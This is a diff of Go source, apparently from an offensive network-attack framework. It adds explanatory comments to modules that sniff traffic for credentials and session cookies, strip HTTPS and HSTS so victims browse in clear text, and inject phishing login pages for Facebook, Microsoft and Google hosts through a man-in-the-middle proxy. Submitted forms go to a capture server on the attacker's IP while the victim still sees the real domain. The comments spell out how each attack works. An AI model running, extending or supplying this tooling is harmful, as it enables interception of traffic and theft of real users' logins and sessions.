@@ -16,6 +16,7 @@ import (
 	"github.com/qyvora/toha3ee/internal/safety"
 )
 
+// init self-registers every espionage module into the global registry.
 func init() {
 	attacks.Register(&HTTPHarvest{})
 	attacks.Register(&HTTPProxy{})
@@ -40,6 +41,8 @@ func (*HTTPHarvest) Meta() attacks.ModuleMeta {
 	}
 }
 
+// harvestState carries the live sniffer and the optional pcap output path so
+// Verify/Cleanup can reach the running capture.
 type harvestState struct {
 	sniff *sniff.Sniffer
 	out   string
@@ -68,6 +71,7 @@ func (*HTTPHarvest) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 		return fmt.Errorf("http.harvest: %w", err)
 	}
 	ctx.SetState("http.harvest", &harvestState{sniff: sniffer, out: out})
+	// Registered cleanup runs even if the session aborts unexpectedly.
 	ctx.Safety.RegisterCleanup("http.harvest", "stop passive sniffer", func() error {
 		sniffer.Stop()
 		return nil
@@ -78,6 +82,7 @@ func (*HTTPHarvest) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 		ctx.Printf("[*] http.harvest capturing traffic (creds and sessions logged as they appear).\n")
 	}
 
+	// Long-running module: beat the watchdog every 2s and exit on ctx.Done.
 	hb := safety.NewHeartbeat()
 	ctx.Heartbeat = hb.Beat
 	ctx.Safety.RegisterHeartbeat("http.harvest", hb)
@@ -115,6 +120,8 @@ func (*HTTPHarvest) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
 
 // Cleanup stops the sniffer.
 func (*HTTPHarvest) Cleanup(ctx *attacks.AttackCtx) error {
+	// Tear down the safety entries first so a second Cleanup pass (session
+	// shutdown) does not double-stop the sniffer.
 	ctx.Safety.UnregisterHeartbeat("http.harvest")
 	ctx.Safety.UnregisterCleanup("http.harvest")
 	if v, ok := ctx.GetState("http.harvest"); ok {
@@ -123,6 +130,7 @@ func (*HTTPHarvest) Cleanup(ctx *attacks.AttackCtx) error {
 	return nil
 }
 
+// fmtBytes renders a byte count as a human-readable size.
 func fmtBytes(b uint64) string {
 	switch {
 	case b >= 1<<20:
@@ -237,6 +245,10 @@ func (*HTTPSProxy) Cleanup(ctx *attacks.AttackCtx) error {
 // Strict-Transport-Security headers, deletes HPKP pinning and rewrites
 // https:// links to http:// so victims keep using clear-text HTTP through the
 // proxy where credentials and sessions can be harvested.
+//
+// How it works in one sentence: if the browser never learns a site is
+// HTTPS-only (no HSTS header cached) and every https:// link is rewritten to
+// http://, the victim browses in the clear and the proxy reads everything.
 type SSLStrip struct{}
 
 // Meta implements attacks.Module.
@@ -269,6 +281,8 @@ func (*SSLStrip) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, er
 // Run starts the HTTP proxy with SSL strip forced on.
 func (*SSLStrip) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 	cfg := proxyConfig(ctx, false)
+	// Force the strip behaviour regardless of the generic sslstrip config
+	// knobs — the module IS the strip.
 	cfg.SSLStrip = true
 	mp := proxy.New(cfg)
 	addr, err := mp.Start()
@@ -296,6 +310,11 @@ func (*SSLStrip) Cleanup(ctx *attacks.AttackCtx) error {
 
 // PhishInject swaps real login pages for the embedded phishing templates and
 // captures submissions on the standalone capture server.
+//
+// The proxy inspects each HTTP response for the brand's hostnames; when a
+// login page matches, the body is replaced by the phishing template whose
+// form posts to the capture server. The victim still sees the real domain in
+// the URL bar.
 type PhishInject struct{}
 
 // Meta implements attacks.Module.
@@ -331,6 +350,8 @@ func (m *PhishInject) Run(ctx *attacks.AttackCtx, opts map[string]string) error 
 	domains := brandDomains(brand, ctx.Conf.Get("phish.inject", "domains"))
 
 	capPort := ctx.Conf.GetDefault("phish.inject", "capture_port", "8081")
+	// The capture server is the sink for submitted phish forms; it writes
+	// straight into the shared store.
 	capture := phish.NewCaptureServer("0.0.0.0:"+capPort, ctx.Store, ctx.Bus, slog.Default())
 	if err := capture.Start(); err != nil {
 		return fmt.Errorf("phish.inject: %w", err)
@@ -338,6 +359,9 @@ func (m *PhishInject) Run(ctx *attacks.AttackCtx, opts map[string]string) error 
 
 	proxyCfg := proxyConfig(ctx, false)
 	proxyCfg.PhishDomains = domains
+	// Swapped forms post to the capture server on the attacker's IP so the
+	// victim's browser can reach it even when it was browsing an external
+	// host.
 	proxyCfg.PhishCaptureURL = "http://" + ctx.Iface.IP.String() + ":" + capPort
 	mp := proxy.New(proxyCfg)
 	addr, err := mp.Start()
@@ -401,12 +425,15 @@ func (*PhishInject) Cleanup(ctx *attacks.AttackCtx) error {
 	return nil
 }
 
+// phishState ties the running proxy, capture server and swapped domains
+// together for Verify/Cleanup.
 type phishState struct {
 	mp      *proxy.MITMProxy
 	capture *phish.CaptureServer
 	domains map[string]string
 }
 
+// templateIDs lists the available phish template IDs for error reporting.
 func templateIDs() []string {
 	ts := phish.ListTemplates()
 	out := make([]string, 0, len(ts))
@@ -416,6 +443,9 @@ func templateIDs() []string {
 	return out
 }
 
+// brandDomains maps a brand to the hostnames that should be swapped. An
+// explicit domains override wins; otherwise built-in per-brand host lists are
+// used. The map value is the brand name the swap engine looks up.
 func brandDomains(brand, override string) map[string]string {
 	base := map[string]string{
 		"facebook":  "facebook.com",
@@ -429,6 +459,8 @@ func brandDomains(brand, override string) map[string]string {
 		}
 		return out
 	}
+	// Facebook owns several surfaces: the main site plus the mobile variants
+	// (m. subdomain) are the ones victims actually log in from.
 	for _, d := range []string{"www.facebook.com", "m.facebook.com", "facebook.com"} {
 		out[d] = brand
 	}
@@ -438,13 +470,15 @@ func brandDomains(brand, override string) map[string]string {
 	if _, ok := base[brand]; ok {
 		return out
 	}
-	// Generic/other brands: swap any host.
+	// Generic/other brands: swap any host. The listed identity/portal hosts
+	// are the most common targets in practice.
 	for _, d := range []string{"login.microsoftonline.com", "accounts.google.com", "mail.google.com", "gmail.com"} {
 		out[d] = brand
 	}
 	return out
 }
 
+// splitList tokenizes a comma/space separated string, dropping empties.
 func splitList(s string) []string {
 	var out []string
 	for _, f := range strings.FieldsFunc(s, func(r rune) bool { return r == ',' || r == ' ' }) {
@@ -455,6 +489,7 @@ func splitList(s string) []string {
 	return out
 }
 
+// keys extracts the keys of a string map (used for stable report lines).
 func keys(m map[string]string) []string {
 	out := make([]string, 0, len(m))
 	for k := range m {
